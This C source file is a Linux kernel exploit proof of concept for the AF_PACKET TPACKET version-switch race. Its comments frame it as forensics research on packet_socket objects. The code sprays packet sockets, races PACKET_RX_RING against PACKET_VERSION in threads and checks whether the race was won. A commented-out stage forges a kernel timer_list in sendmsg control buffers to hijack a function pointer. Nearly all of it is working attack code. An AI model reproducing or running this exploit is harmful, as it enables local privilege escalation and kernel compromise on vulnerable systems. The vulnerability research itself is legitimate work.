//The goal here is to create af packets.
//This should create struct packet_socket objects allocated by the SLUB allocator.
//I will then dump the memory on the emulator using lime and try to find these sockets.
//I can then compare the size with that of what I determined from my kernel module to print the sizes and output.
//(y)
#define _GNU_SOURCE
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/wait.h>
#include <assert.h>
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/if_ether.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <linux/if_packet.h>
#include <pthread.h>
#include <linux/sched.h>
#include <netinet/tcp.h>
#include <sys/syscall.h>
#include <signal.h>
#include <sched.h>
#include <sys/utsname.h>
#include <pthread.h>
#define BUFLEN 723
#define DATALEN 8192
#define NUM_THREADS 200

volatile int* check;
volatile int barrier = 1;
volatile int vers_switcher_done = 0;

#define TIMER_OFFSET 252
struct timer_list {
        int next;
        int prev;
        //struct list_head           entry;                /*     0     8 */
        long unsigned int          expires;              /*     8     4 */
        int base;//struct tvec_base *         base;                 /*    12     4 */
        void                       (*function)(long unsigned int); /*    16     4 */
        long unsigned int          data;                 /*    20     4 */
        int                        slack;                /*    24     4 */

        /* size: 28, cachelines: 1, members: 6 */
        /* last cacheline: 28 bytes */
};

typedef union {
    char   control[CMSG_SPACE(BUFLEN)];
    struct cmsghdr cmh;
    struct {
        char padding[TIMER_OFFSET];
        struct timer_list timer;
    };
    /* Space large enough to hold a ucred structure */
} control_un;

#define PAD 64
//int  ad_fds[PAD];

#define CONF_RING_FRAMES 1


struct tpacket_req3 tp;
int sfd;
int mapped = 0;

void func(long unsigned int asdf) {
    *check = 1;
    ;
}

void pad_kmalloc(void)
{
    int x;

    for(x=0; x<PAD; x++)
        if(socket(AF_PACKET,SOCK_DGRAM,htons(ETH_P_ARP)) == -1) {
            fprintf(stderr,"pad_kmalloc() socket error\n");
            exit(1);
        }

}

void* lock_ctlbuf(void* arg) {
    control_un* ctrl_un = (control_un*)arg;
    char buf2[100];
    int fd,rc,i;
    struct sockaddr_in server;
    char message[1000] , server_reply[2000];
    
    struct cmsghdr *cmhp;
    struct msghdr msgh;
    struct iovec iov;
    char data[DATALEN];
     
    //Create socket
    fd = socket(AF_INET , SOCK_STREAM , 0);
    if (fd == -1)
    {
        perror("Could not create socket");
    }

    int sendbuff = 1024;
    if (setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &sendbuff, sizeof(sendbuff)) < 0) {
        perror("Setting sock buff size");
    }

     
    server.sin_addr.s_addr = inet_addr("127.0.0.1");
    server.sin_family = AF_INET;
    server.sin_port = htons( 5000 );
 
    //Connect to remote server
    if (connect(fd , (struct sockaddr *)&server , sizeof(server)) < 0)
    {
        perror("connect failed. Error");
    }
     
    msgh.msg_name = NULL;
    msgh.msg_namelen = 0;

    msgh.msg_control = ctrl_un->control;
    msgh.msg_controllen = sizeof(ctrl_un->control);

    msgh.msg_iov = &iov;
    msgh.msg_iovlen = 1;
    iov.iov_base = &data;
    iov.iov_len = sizeof(data);
    memset(&data, 0x41, sizeof(data));

    for ( i = 0; i < 600; ++i) {

        int res = sendmsg(fd, &msgh,0);
        if( res < 0)  {
                perror("sendmsg");
        }
    }
    pthread_exit(NULL);
}

// Attack Part I 
// Call PACKET_RX_RING option once to set a timer.
void *setsockopt_thread(void *arg)
{
    while(barrier) {
    }
    setsockopt(sfd, SOL_PACKET, PACKET_RX_RING, (void*) &tp, sizeof(tp));

    return NULL;
}

// Attack Part II
// Race Part I and try to flip the Version from 1 to 3 
void *vers_switcher(void *arg)
{
    int val,x,y;

    while(barrier) {}

    while(1) {
        val = TPACKET_V1;
        x = setsockopt(sfd, SOL_PACKET, PACKET_VERSION, &val, sizeof(val));

        y++;

        if(x != 0) break;

        val = TPACKET_V3;
        x = setsockopt(sfd, SOL_PACKET, PACKET_VERSION, &val, sizeof(val));

        if(x != 0) break;

        y++;
    }
    if (x < 0) {
        printf("%s\n",strerror(errno));
        fflush(stdout);
        //vers_switcher_done = 1;
        //return NULL;
    }

    fprintf(stderr,"version switcher stopping, x = %d (y = %d, last val = %d)\n",x,y,val);
    vers_switcher_done = 1;


    return NULL;
}


int main(int argc, char** argv) 
{
    printf("asdfasdf");
    fflush(stdout);
    int fd;
    int val;
    int off;
    control_un ctrl_un;
    //int threadCount = atoi(argv[1]);
    pthread_t setsockopt_thread_thread,a;
    struct tpacket_block_desc *pbd;
    socklen_t l;

    check = (int*)malloc(sizeof(int));
    if (!check) {
        perror("failed to malloc check\n");
        exit(1);
    } 
    *check = 0;
    printf("asdfasdf");
    fflush(stdout);

    pad_kmalloc();

    fd=socket(AF_PACKET,SOCK_DGRAM,htons(ETH_P_ARP));

    if (fd==-1) {
        perror("target socket error\n");
        exit(1);
    }
    // want to create 
    struct stat tgtStat;
    if (fstat(fd,&tgtStat) < 0) {
        perror("fstat");
    } else {
        printf("target socket inode: %d\n", (unsigned int)tgtStat.st_ino);
        fflush(stdout);
    }

    pad_kmalloc();
    fprintf(stderr,"sockets allocated\n");

    printf("Start Attack..\n");
    fflush(stdout);

    val = TPACKET_V3;

    


    tp.tp_block_size = CONF_RING_FRAMES * getpagesize();
    tp.tp_block_nr = 1;
    tp.tp_frame_size = getpagesize();
    tp.tp_frame_nr = CONF_RING_FRAMES;

//try to set the timeout to 10 seconds
//the default timeout might still be used though depending on when the race was won
    tp.tp_retire_blk_tov = 10000;
    while(1) {
        fd=socket(AF_PACKET,SOCK_DGRAM,htons(ETH_P_ARP));

        if (fd==-1) {
            perror("target socket error\n");
            exit(1);
        }

        int res = setsockopt(fd, SOL_PACKET, PACKET_VERSION, &val, sizeof(val));
        if  (res < 0) {
            printf("%s\n",strerror(errno));
            fflush(stdout);
            return 1;
        }

        sfd = fd;

        barrier = 1;
        vers_switcher_done = 0;

        if(pthread_create(&setsockopt_thread_thread, NULL, setsockopt_thread, (void *)NULL)) {
            fprintf(stderr, "Error creating thread\n");
            return 1;
        }


        pthread_create(&a, NULL, vers_switcher, (void *)NULL);

        usleep(200000);

        fprintf(stderr,"removing barrier and !spraying..\n");

        barrier = 0;

        usleep(100000);

        while(!vers_switcher_done)usleep(100000);

        l = sizeof(val);
        getsockopt(sfd, SOL_PACKET, PACKET_VERSION, &val, &l);

        fprintf(stderr,"current packet version = %d\n",val);

        pbd = mmap(0, tp.tp_block_size * tp.tp_block_nr, PROT_READ | PROT_WRITE, MAP_SHARED, sfd, 0);


        if(pbd == MAP_FAILED) {
            fprintf(stderr,"could not map pbd\n");
            exit(1);
        }

        else {
            off = pbd->hdr.bh1.offset_to_first_pkt;
            fprintf(stderr,"pbd->hdr.bh1.offset_to_first_pkt = %d\n",off);
        }

        // did we win?
        if(val == TPACKET_V1 && off != 0) {
            fprintf(stderr,"*=*=*=* TPACKET_V1 && offset_to_first_pkt != 0, race won *=*=*=*\n");
            break; //yeh we did bro
        } else {
            fprintf(stderr, "you suck");
        }
        //close(sfd);
    }
    if(check) {
        free((void*)check);
    }
    return 0;

    //while(1) {
    //    char x = getc(stdin);
    //    if (x == 'b') {
    //        close(fd);
    //        fprintf(stderr,"target socket freed\n");
    //        break;
    //    }
    //}

    //memset(&ctrl_un, 0x00, sizeof(ctrl_un));
    //memset(&ctrl_un, 0x42, sizeof(ctrl_un));
    //ctrl_un.cmh.cmsg_len = CMSG_LEN(BUFLEN);
    //ctrl_un.cmh.cmsg_level = SOL_SOCKET;
    //ctrl_un.cmh.cmsg_type = SCM_RIGHTS;
    //ctrl_un.timer.next = 0;
    //ctrl_un.timer.prev = 0;
    //ctrl_un.timer.base = 0;
    //ctrl_un.timer.expires = 4294943360u;
    //ctrl_un.timer.function = (void *)func;
    //ctrl_un.timer.data = 1;
    ////ctrl_un.timer.flags = 1;
    //ctrl_un.timer.slack = -1;

    ////start threads and alloc ctl buf's in slabs
    //pthread_t dummy;
    //long rc,t;
    //for (t = 0; t < threadCount; t++) {
    //    rc = pthread_create(&dummy, NULL, lock_ctlbuf, (void*)&ctrl_un);
    //    if (rc) {
    //        perror("pthread_create()");
    //        exit(1);
    //    }
    //}
    //pthread_exit(NULL);
    //sleep(13377);
    return 0;
}
